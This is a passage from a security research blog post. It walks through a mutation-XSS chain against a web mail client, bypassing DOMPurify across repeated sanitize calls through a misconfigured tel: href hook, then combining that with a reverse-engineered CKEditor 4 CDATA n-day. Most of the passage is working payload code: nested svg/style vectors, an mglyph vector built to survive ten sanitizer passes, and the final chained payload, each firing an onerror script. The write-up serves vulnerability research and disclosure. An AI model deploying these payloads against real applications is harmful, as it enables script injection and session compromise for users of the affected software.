+              <span class="nx">data</span><span class="p">.</span><span class="nx">keepAttr</span> <span class="o">=</span> <span class="o">!</span><span class="mi">1</span><span class="p">;</span>                                                                                   
+          <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nx">element</span> <span class="k">instanceof</span> <span class="nx">HTMLElement</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">style</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">())</span>                     
+              <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cssSanitizer</span><span class="p">.</span><span class="nf">sanitizeStyle</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">style</span><span class="p">);</span>
+          <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="dl">"</span><span class="s2">href</span><span class="dl">"</span> <span class="o">===</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrName</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">var</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">attrValue</span> <span class="o">||</span> <span class="dl">""</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+              <span class="k">if </span><span class="p">([</span><span class="dl">"</span><span class="s2">tel</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">fax</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">sip</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">mailto</span><span class="dl">"</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="nx">protocol</span><span class="p">))</span>
+                  <span class="k">return</span> <span class="k">void </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">forceKeepAttr</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span>
+          <span class="p">}</span>
+      <span class="p">}</span> 
+</code></pre></div></div>
+
+<p>In case the <code class="language-plaintext highlighter-rouge">href</code> attribute value contained any of these protocols it would set the <code class="language-plaintext highlighter-rouge">forceKeepAttr</code> property to true.</p>
+
+<p>It means something like this will remain untouched when passed through DOMPurify, otherwise without this misconfiguration the <code class="language-plaintext highlighter-rouge">href</code> attribute would have been removed.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"tel:&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;"</span><span class="nt">&gt;&lt;/a&gt;</span>
+</code></pre></div></div>
+
+<p>In such scenario the below payload would provide us with a full bypass.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">503</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">dirty</span> <span class="o">=</span> <span class="s2">`
+</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;r&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2"> &lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;
+&lt;style&gt;&lt;a href="tel:&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/a&gt;&lt;/style&gt;
+&lt;/svg&gt;&lt;/desc&gt;&lt;/svg&gt;&lt;/a&gt;
+`</span><span class="p">;</span>
+
+<span class="c1">//assume the same hooks are configured and it is using 3.1.5 dompurify version</span>
+
+<span class="kd">var</span> <span class="nx">clean</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">)</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clean</span>
+</code></pre></div></div>
+
+<p>But on the target this didn’t work, the onerror attribute was removed this left me wondering if there was another sanitizer in place? I checked again and realised DOMPurify is called one more time ah. This behaviour is actually where DOMPurify is run more than once assuming it would catch any bypass attempt as well which were bypassed in the first call.</p>
+
+<p>But worry not Mizu again has our back, in the first blog where he disclosed all the bypasses there is a case of Mermaid as well. Mermaid deals with arbitrary html and in order to protect against xss they do similar things where they call DOMPurify more than once.</p>
+
+<p>Here you can see the bypass payload taken from the blog, where DOMPurify is called two times.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">503</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">dirty</span> <span class="o">=</span> <span class="s2">`
+</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;form&gt;&lt;h1&gt;&lt;/form&gt;&lt;table&gt;&lt;form&gt;&lt;/form&gt;&lt;/table&gt;&lt;/form&gt;&lt;/table&gt;&lt;/h1&gt;&lt;/form&gt;</span><span class="se">\n</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2">
+&lt;a&gt;
+    &lt;svg&gt;
+        &lt;desc&gt;
+            &lt;svg&gt;
+                &lt;image&gt;
+                    &lt;a&gt;
+                        &lt;desc&gt;
+                            &lt;svg&gt;
+                                &lt;image&gt;&lt;/image&gt;
+                            &lt;/svg&gt;
+                        &lt;/desc&gt;
+                    &lt;/a&gt;
+                &lt;/image&gt;
+                &lt;title&gt;&lt;a id="&lt;/title&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/a&gt;&lt;/title&gt;
+            &lt;/svg&gt;
+        &lt;/desc&gt;
+    &lt;/svg&gt;
+&lt;/a&gt;
+`</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">step1</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">step1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Cool so in the sandbox iframe content I could see the xss payload but here comes the twist when I clicked on the Reply button the value passed to CKEditor was the sanitized version so it meant DOMPurify was again being called here, I checked by setting breakpoints and yeah it was true it was going through 2 more iterations when the user clicks on reply button. So in total there were 4 iterations of DOMPurify sanitize call.</p>
+
+<p>There was a lot of stuff happening, in the example code things look easy to spot but when you are dealing with real applications they don’t appear the same way always there will be a lot of irrelevant pieces it’s all about identifying the pattern by reducing the surrounding noise. I didn’t want to understand everything and was trying to find a quick win on this mail sanitizer.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">clean1</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">)</span>                                                                                
+<span class="nx">clean2</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean1</span><span class="p">)</span>                                                                               
+<span class="nx">clean3</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean2</span><span class="p">)</span>                                                                               
+<span class="nx">clean4</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean3</span><span class="p">)</span>                                                                               
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clean4</span>
+</code></pre></div></div>
+
+<p>There was a challenge around very old version of DOMPurify from [@S1r1u5<em>](https://x.com/S1r1u5</em>). The only thing surprising about this challenge was DOMPurify was called 10 times.</p>
+
+<div class="link-preview">
+  <a href="https://x.com/S1r1u5_/status/1837431552676188491" target="_blank" rel="noopener">
+    <div class="link-preview-content">
+      <div class="link-preview-title">JavaScript is not available.</div>
+      
+      <div class="link-preview-description">We’ve detected that JavaScript is disabled in this browser. Please enable JavaScript or switch to a supported browser to continue using x.com. You can see a list of supported browsers in our Help Center.</div>
+      
+      <div class="link-preview-domain">x.com</div>
+    </div>
+  </a>
+</div>
+
+<p>My solution to this was very simple, I just needed to hide my payload and have it mutate after the 10th iteration only</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa<span class="nt">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;</span><span class="o">&lt;!</span><span class="nt">--&lt;/style&gt;&lt;a</span> <span class="na">id=</span><span class="s">"--&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/table&gt;&lt;/style&gt;"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Mizu went overkill for this challenge :p and came up with a crazy vector
+<img alt="image" src="/assets/images/mxss/5.png" /></p>
+
+<p><br /></p>
+
+<p>The way he smuggled the broken pieces of the payload half inside the attribute value and half inside the style content is super clever plus the arrangement of the style tag creativity at its peak. The base idea around this bypass is related to the parsing quirk for <code class="language-plaintext highlighter-rouge">mglyph</code> element.</p>
+
+<div class="link-preview">
+  <a href="https://web.archive.org/web/20220903190106/https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://web.archive.org/web/20220903190106im_/https://research.securitum.com/wp-content/uploads/sites/2/2020/10/image-1-1024x104.png" alt="Mutation XSS via namespace confusion - DOMPurify &lt; 2.0.17 bypass - research.securitum.com" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">Mutation XSS via namespace confusion - DOMPurify &lt; 2.0.17 bypass - research.securitum.com</div>
+      
+      <div class="link-preview-description">In this blogpost I’ll explain my recent bypass in DOMPurify – the popular HTML sanitizer library. In a nutshell, DOMPurify’s job is to take an untrusted HTML snippet, supposedly coming from an end-user, and remove all elements and attributes that can lead to Cross-Site Scripting (XSS). This is the bypass: Believe me that there’s not ...</div>
+      
+      <div class="link-preview-domain">web.archive.org</div>
+    </div>
+  </a>
+</div>
+
+<div class="link-preview">
+  <a href="https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://portswigger.net/content/images/logos/portswigger-twittercardlogo.png" alt="Bypassing DOMPurify again with mutation XSS" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">Bypassing DOMPurify again with mutation XSS</div>
+      
+      <div class="link-preview-description">After seeing Michał Bentkowski's DOMPurify bypass and the resulting patch, I was inspired to try and crack the patched version myself. Looking at his vector I saw he used style with math based tags to</div>
+      
+      <div class="link-preview-domain">portswigger.net</div>
+    </div>
+  </a>
+</div>
+
+<p>I came up with the following payload to bypass 4 iterations of DOMPurify</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">503</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">dirty</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;form&gt;&lt;h1&gt;&lt;/form&gt;&lt;table&gt;&lt;form&gt;&lt;/form&gt;&lt;/table&gt;&lt;/form&gt;&lt;/table&gt;&lt;/h1&gt;&lt;/form&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2">&lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;&lt;style&gt;&lt;a href="tel:&lt;/style&gt;&lt;/form&gt;</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;form&gt;&lt;h1&gt;&lt;/form&gt;&lt;table&gt;&lt;form&gt;&lt;/form&gt;&lt;/table&gt;&lt;/form&gt;&lt;/table&gt;&lt;/h1&gt;&lt;/form&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2">&lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;&lt;style&gt;&lt;a href='tel:&lt;/style&gt;&lt;img src=x onerror=alert()&gt;'&gt;"&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/svg&gt;&lt;/a&gt;`</span><span class="p">;</span>
+
+<span class="nx">clean1</span><span class="o">=</span><span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">,{</span><span class="na">SAFE_FOR_XML</span><span class="p">:</span> <span class="kc">false</span><span class="p">})</span>
+<span class="nx">clean2</span><span class="o">=</span><span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean1</span><span class="p">,{</span><span class="na">SAFE_FOR_XML</span><span class="p">:</span> <span class="kc">false</span><span class="p">})</span>
+<span class="nx">clean3</span><span class="o">=</span><span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean2</span><span class="p">,{</span><span class="na">SAFE_FOR_XML</span><span class="p">:</span> <span class="kc">false</span><span class="p">})</span>
+<span class="nx">clean4</span><span class="o">=</span><span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean3</span><span class="p">,{</span><span class="na">SAFE_FOR_XML</span><span class="p">:</span> <span class="kc">false</span><span class="p">})</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">clean4</span>
+</code></pre></div></div>
+
+<p>The base idea for this payload is the same as Mizu’s which he used to bypass two iterations of DOMPurify, I have only included the same payload one more time inside of the attribute to bypass four iterations. I was doing this testing on a local setup as that was easier.</p>
+
+<p>As I had a successful bypass now for DOMPurify I moved on to CKEditor to reverse engineer the POC for the past advisory</p>
+
+<h1 id="reverse-engineering-the-ckeditor-n-day">Reverse Engineering the CKEditor N-Day</h1>
+
+<div class="link-preview">
+  <a href="https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-fq6h-4g8v-qqvm" target="_blank" rel="noopener">
+    <div class="link-preview-content">
+      <div class="link-preview-title">Cross-site scripting (XSS) vulnerability caused by incorrect CDATA detection</div>
+      
+      <div class="link-preview-description">GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.</div>
+      
+      <div class="link-preview-domain">github.com</div>
+    </div>
+  </a>
+</div>
+
+<p><em>A potential vulnerability has been discovered in CKEditor 4 HTML processing core module. The vulnerability allowed to inject malformed HTML content bypassing Advanced Content Filtering mechanism, which could result in executing JavaScript code. An attacker could abuse faulty CDATA content detection and use it to prepare an intentional attack on the editor. It affects all users using the CKEditor 4 at version &lt; 4.24.0-lts.</em></p>
+
+<p>Looking into the Mail to see how CKEditor is implemented I could see the first argument is supposed to be the element selector and the second argument contains the json config one thing to note here was that it had this <code class="language-plaintext highlighter-rouge">extraAllowedContent: style</code> which allows style elements otherwise in default config this is removed.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">editor</span> <span class="o">=</span> <span class="nx">CKEDITOR</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Based on the Advisory it was fixed in version 4.24.0-lts, so we will start by <a href="https://github.com/ckeditor/ckeditor4/compare/4.23.0-lts...4.24.0-lts">diffing the previous version</a></p>
+
+<p>Easily found the commit related to it <em>Fix CDATA parsing logic</em>. I setup some breakpoints around it and started playing with the code changes.</p>
+
+<p>The parsing for CDATA alone is happening <a href="https://github.com/ckeditor/ckeditor4/blob/c7e59ec199298b6b23f4aa7a7668f18572385bac/core/htmlparser/cdata.js#L27C2-L27C27">here</a></p>
+
+<p>Ryotak has a nice writeup around CDATA parsing logics which allowed him to bypass DOMPurify</p>
+
+<div class="link-preview">
+  <a href="https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/" target="_blank" rel="noopener">
+    
+    <div class="link-preview-image">
+      <img src="https://flatt.tech/research/bypassing-dompurify-with-good-old-xml-thumbnail.png" alt="Bypassing DOMPurify with good old XML" loading="lazy" />
+    </div>
+    
+    <div class="link-preview-content">
+      <div class="link-preview-title">Bypassing DOMPurify with good old XML</div>
+      
+      <div class="link-preview-description">How I could bypass DOMPurify with XML</div>
+      
+      <div class="link-preview-domain">flatt.tech</div>
+    </div>
+  </a>
+</div>
+
+<p>Directly testing it on a local setup was much easier than focusing too much on the source, as the advisory comments had some mentioning around STYLE I tried playing around embedding CDATA blocks inside of it. My focus was if I can hide the closing style tag inside of CDATA which will allow me to hide a payload that gets missed by the CKEditor sanitizer, but when parsed by the browser the hidden payload comes into action.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shirley <span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span> <span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span>testinggg }]]&gt;<span class="nt">&lt;/style&gt;</span> // input
+shirley <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span> <span class="nt">testinggg</span> <span class="err">}</span><span class="o">]]&amp;</span><span class="nt">gt</span><span class="o">;</span> <span class="nt">&lt;/style&gt;</span>  // output
+</code></pre></div></div>
+
+<p>By setting a breakpoint on this line <code class="language-plaintext highlighter-rouge">this.onCDATA( cdata.join( '' ) )</code> I could see what all is parsed as CDATA block. In the screenshot you can see the array <code class="language-plaintext highlighter-rouge">h</code> containing all the parts.</p>
+
+<p><img alt="image" src="/assets/images/mxss/6.png" /></p>
+
+<p><br /></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shirley <span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span> aaaaaaaaaaaaaaaaaaaaaaa  <span class="nt">&lt;style&gt;</span> <span class="err">}</span><span class="o">]]&gt;</span> <span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+
+<p><img alt="image" src="/assets/images/mxss/7.png" /></p>
+
+<p><br /></p>
+
+<p>In the fixed version the same input produces a different output</p>
+
+<p><img alt="image" src="/assets/images/mxss/8.png" /></p>
+
+<p><br /></p>
+
+<p>So what happened here let me explain, first let’s see how the same gets parsed by the Browser</p>
+
+<iframe style="width:100%; height:500px; border:1px solid #333; border-radius:8px;" sandbox="allow-scripts allow-modals allow-popups allow-same-origin" src="https://yeswehack.github.io/Dom-Explorer/frame?input=editable&amp;titleBar=readonly&amp;readonly=true&amp;pipe[titleBar]=true&amp;pipe[settings]=true&amp;pipe[render]=true&amp;pipe[skip]=true#eyJpbnB1dCI6InNoaXJsZXkgPHN0eWxlPjwhW0NEQVRBW2gxIHsgY29sb3I6IHJlZDs8L3N0eWxlPiA8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoKT4gYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEgIDxzdHlsZT4gfV1dPiA8L3N0eWxlPiIsInBpcGVsaW5lcyI6W3siaWQiOiJpaG9kM2M4dCIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJkNHNpMzdjZyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ=="></iframe>
+
+<p>This is what the browser sees (newline denotes the end of each element), I have already explained about the STYLE element in the starting of the blogpost</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span> aaaaaaaaaaaaaaaaaaaaaaa
+<span class="nt">&lt;style&gt;</span> <span class="err">}</span><span class="o">]]&gt;</span> <span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+
+<p>And this is what the CKEditor HTML parser sees, when parsing CDATA block CKEditor doesn’t take into account the closing STYLE tag it just looks for the closing CDATA block <code class="language-plaintext highlighter-rouge">]]&gt;</code> and consumes everything that comes in between:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span>
+<span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span> aaaaaaaaaaaaaaaaaaaaaaa  <span class="nt">&lt;style&gt;</span> <span class="err">}</span><span class="o">]]&gt;</span> 
+<span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+
+<p>This creates a parser discrepancy between the CKEditor HTML parser and how the browser parses the same HTML, the core fundamental of any mutation bug is to find exactly this kind of discrepancy. The <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag which CKEditor thinks is harmless CDATA content sitting inside style will actually be rendered as active HTML by the browser. We have our CKEditor XSS also now</p>
+
+<p><img alt="image" src="/assets/images/mxss/9.png" /></p>
+
+<p><br /></p>
+
+<h1 id="the-final-chain">The Final Chain</h1>
+
+<p>We are getting closer to our goal, to summarise we tested out our bypass locally for DOMPurify which works with bypassing four iterations of DOMPurify sanitize plus we also now have the CKEditor n-day poc. Now we just need to place the CKEditor payload inside our DOMPurify bypass.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">503</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">dirty</span> <span class="o">=</span> <span class="s2">`aaaaaaaaaaaaaaaaaaa</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;form&gt;&lt;h1&gt;&lt;/form&gt;&lt;table&gt;&lt;form&gt;&lt;/form&gt;&lt;/table&gt;&lt;/form&gt;&lt;/table&gt;&lt;/h1&gt;&lt;/form&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2">&lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;&lt;style&gt;&lt;a href="tel:&lt;/style&gt;&lt;/form&gt;</span><span class="p">${</span><span class="dl">"</span><span class="s2">&lt;form&gt;&lt;h1&gt;&lt;/form&gt;&lt;table&gt;&lt;form&gt;&lt;/form&gt;&lt;/table&gt;&lt;/form&gt;&lt;/table&gt;&lt;/h1&gt;&lt;/form&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">n</span><span class="p">)}</span><span class="s2">&lt;a&gt;&lt;svg&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;a&gt;&lt;desc&gt;&lt;svg&gt;&lt;image&gt;&lt;/image&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/a&gt;&lt;/image&gt;&lt;style id=jj&gt;&lt;a href='tel:&lt;/style&gt;shirley &lt;style&gt;&lt;![CDATA[h1 { color: red;&lt;/style&gt; &lt;img src=x onerror=alert()&gt; aaaaaaaaaaaaaaaaaaaaaaa  &lt;style&gt; }]]&gt; &lt;/style&gt;'&gt;"&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt;&lt;/desc&gt;&lt;/svg&gt;&lt;/a&gt;`</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">clean</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">clean1</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">clean2</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean1</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">clean3</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">clean2</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">clean3</span><span class="p">);</span>
+
+  <span class="c1">// Load sanitized HTML into CKEditor</span>
+  <span class="nx">CKEDITOR</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">instanceReady</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">evt</span><span class="p">.</span><span class="nx">editor</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="nx">clean3</span><span class="p">);</span>
+  <span class="p">});</span>
+  <span class="nx">CKEDITOR</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">editor</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">extraAllowedContent</span><span class="p">:</span> <span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">});</span>
+</code></pre></div></div>
+
+<p><img alt="image" src="/assets/images/mxss/10.png" /></p>
+
+<p><br /></p>
+
+<p>The only change I made was here, inside the attribute value you can see it contains the CKEditor payload which I demonstrated just above.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;style id=jj&gt;&lt;a href='tel:&lt;/style&gt;shirley &lt;style&gt;&lt;![CDATA[h1 { color: red;&lt;/style&gt; &lt;img src=x onerror=alert()&gt; aaaaaaaaaaaaaaaaaaaaaaa  &lt;style&gt; }]]&gt; &lt;/style&gt;'&gt;"&gt;
+</code></pre></div></div>
+
